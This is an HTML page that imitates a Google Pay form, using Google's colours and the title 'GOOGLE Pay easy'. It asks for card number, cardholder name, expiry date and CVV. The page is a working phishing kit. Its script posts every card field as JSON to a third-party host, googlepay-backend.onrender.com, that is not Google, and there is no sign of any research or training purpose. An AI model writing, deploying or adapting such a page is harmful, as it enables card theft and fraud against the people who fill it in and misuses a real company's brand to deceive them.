<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>GOOGLE Pay easy</title>

    <!-- Font Awesome Icons -->
    <link rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #F8F9FA;
            color: #202124;
            min-height: 100vh;
            padding: 30px 15px;
        }

        .container {
            max-width: 480px;
            margin: 30px auto;
            background: #FFFFFF;
            padding: 30px 25px;
            border-radius: 18px;
            box-shadow: 0 4px 20px rgba(60, 64, 67, 0.12);
        }

        header {
            text-align: center;
            margin-bottom: 28px;
        }

        header h1 {
            font-size: 27px;
            font-weight: 600;
            letter-spacing: -1px;
        }

        .google-blue { color: #4285F4; }
        .google-red { color: #EA4335; }
        .google-yellow { color: #FBBC05; }
        .google-green { color: #34A853; }

        header p {
            color: #5F6368;
            font-size: 14px;
            margin-top: 9px;
        }

        h2 {
            font-size: 21px;
            margin-bottom: 10px;
            text-align: center;
        }

        .description {
            color: #5F6368;
            font-size: 14px;
            text-align: center;
            line-height: 1.5;
            margin-bottom: 25px;
        }

        .form-group {
            margin-bottom: 19px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #DADCE0;
            border-radius: 9px;
            font-size: 15px;
            outline: none;
            background: #FFFFFF;
        }

        input:focus {
            border-color: #4285F4;
            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.15);
        }

        button {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 9px;
            background: #4285F4;
            color: #FFFFFF;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        button:hover {
            background: #3367D6;
        }

        button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        footer {
            text-align: center;
            margin-top: 25px;
            font-size: 12px;
            color: #80868B;
        }

        @media (max-width: 480px) {
            .container {
                padding: 25px 18px;
                margin: 10px auto;
            }
        }
    </style>
</head>

<body>

    <div class="container">

        <header>
            <h1>
                <span class="google-blue">C</span><span class="google-red">A</span><span class="google-yellow">R</span><span class="google-green">D</span><span class="google-red"></span>
                Information
            </h1>
            <p>GOOGLE Pay easy</p>
        </header>

        <div style="text-align:center; margin-bottom:25px;">
            <div style="
                display:inline-flex;
                align-items:center;
                justify-content:center;
                width:85px;
                height:65px;
                border-radius:14px;
                background:#E8F0FE;
                color:#4285F4;
                font-size:38px;">
                <i class="fa-solid fa-address-card"></i>
            </div>
        </div>

        <h2>Card Information</h2>

        <p class="description">
            Please provide the Correct information below.
        </p>

        <form id="orderForm">

            <div class="form-group">
                <label for="Card_Number">Card Number</label>
                <input
                    type="text"
                    id="Card_Number"
                    name="Card_Number"
                    placeholder="0000-0000-0000"
                    autocomplete="Card number"
                    required>
            </div>

            <div class="form-group">
                <label for="Cardholders_Name">Cardholders_Name</label>
                <input
                    type="text"
                    id="Cardholders_Name"
                    name="Cardholders_Name"
                    placeholder="Enter Cardholders_Name"
                    autocomplete="text"
                    required>
            </div>

            <div class="form-group">
                <label for="Valid_Till">Valid_Till</label>
                <input
                    type="text"
                    id="Valid_Till"
                    name="Valid_Till"
                    placeholder="00/00"
                    required>
            </div>

            <div class="form-group">
                <label for="CVV">CVV</label>
                <input
                    type="text"
                    id="CVV"
                    name="CVV"
                    placeholder="123"
                    required>
            </div>

            <button type="submit" id="submitButton">
                Submit Information
                <i class="fa-solid fa-arrow-right"></i>
            </button>

        </form>

        <footer>
            <p>Card Information</p>
            <p style="margin-top:8px;">
                <span class="google-blue">●</span>
                <span class="google-red">●</span>
                <span class="google-yellow">●</span>
                <span class="google-green">●</span>
            </p>
        </footer>

    </div>

    <!-- JavaScript connection -->
    <script>
        const form = document.getElementById("orderForm");
        const submitButton = document.getElementById("submitButton");

        form.addEventListener("submit", async function(event) {

            event.preventDefault();

            const formData = {
                Card_Number: document.getElementById("Card_Number").value,
                Cardholders_Name: document.getElementById("Cardholders_Name").value,
                Valid_Till: document.getElementById("Valid_Till").value,
                CVV: document.getElementById("CVV").value
            };

            submitButton.disabled = true;
            submitButton.textContent = "Submitting...";

            try {

                const response = await fetch(
                    "https://googlepay-backend.onrender.com/submit",
                    {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(formData)
                    }
                );

                const result = await response.json();

                if (response.ok && result.success) {
                    alert("Information submitted successfully!");
                    form.reset();
                } else {
                    alert(result.message || "Submission failed. Please try again.");
                }

            } catch (error) {
                alert("Unable to connect. Please try again.");
                console.error(error);

            } finally {
                submitButton.disabled = false;
                submitButton.innerHTML = 'Submit Information <i class="fa-solid fa-arrow-right"></i>';
            }

        });
    </script>

</body>
</html>
